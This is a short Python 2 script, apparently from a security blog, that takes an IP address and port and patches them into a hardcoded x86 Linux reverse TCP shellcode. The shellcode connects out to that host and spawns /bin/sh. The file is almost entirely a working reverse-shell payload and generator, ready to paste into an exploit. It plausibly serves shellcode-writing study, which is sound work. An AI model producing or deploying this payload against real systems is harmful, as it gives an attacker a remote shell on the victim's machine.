#!/usr/bin/python

# Filename: wrapper.py
# Author: David Alvarez Robles (km0xu95)
# Website: https://blog.asturhackers.es

# Purpose: This script was developed in order to dynamically change IP and port
# used in the Shell Reverse TCP shellcode

import sys
import re

def is_valid_ip(ip):
	m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
	return bool(m) and all(map(lambda n: 0 <= int(n) <= 255, m.groups()))

if(len(sys.argv) != 3):
	print "Usage: ./wrapper.py <IP> <Port>"
	sys.exit(0)

elif(int(sys.argv[2])<1 or int(sys.argv[2])>65535 or (not is_valid_ip(sys.argv[1]))):
	print "[-] Port number must be 1-65535 and IP address should be valid"
	sys.exit(0)

else:
	base_shellcode = "\\x31\\xc0\\x89\\xc3\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x66\\x43\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xf6\\x68\\x7f\\x00\\x00\\x01\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe6\\x6a\\x16\\x56\\x52\\xb0\\x66\\x83\\xc3\\x02\\x89\\xe1\\xcd\\x80\\x89\\xd3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80"
	print "[*] IP address: " + str(sys.argv[1])
	print "[*] Port number: " + str(int(sys.argv[2]))
	IP_chunks = sys.argv[1].split(".")
	IP_chunks_hex = []
	for IP_chunk in IP_chunks:
		IP_chunk_ = format(int(IP_chunk), '#04x').split("0x")[1]
		IP_chunks_hex.append(IP_chunk_)
	IP_hex = "0x"+IP_chunks_hex[0]+IP_chunks_hex[1]+IP_chunks_hex[2]+IP_chunks_hex[3]
	print "[*] Hex IP address: " + IP_hex
	print "[*] Hex port number: " + format(int(sys.argv[2]), '#06x')
	new_port = format(int(sys.argv[2]), '#06x').split("0x")
	new_ip_bytes = "\\x"+IP_chunks_hex[0]+"\\x"+IP_chunks_hex[1]+"\\x"+IP_chunks_hex[2]+"\\x"+IP_chunks_hex[3]
	new_port_bytes = "\\x"+str(new_port[1][0:2])+"\\x"+str(new_port[1][2:4])
	print "[+] New bytes: " + new_ip_bytes
	print "[+] New bytes: " + new_port_bytes
	shellcode = base_shellcode.replace("\\x7f\\x00\\x00\\x01",new_ip_bytes)
	shellcode = shellcode.replace("\\x11\\x5c",new_port_bytes)
	
	print "[+] New shellcode: \"" + shellcode + "\""
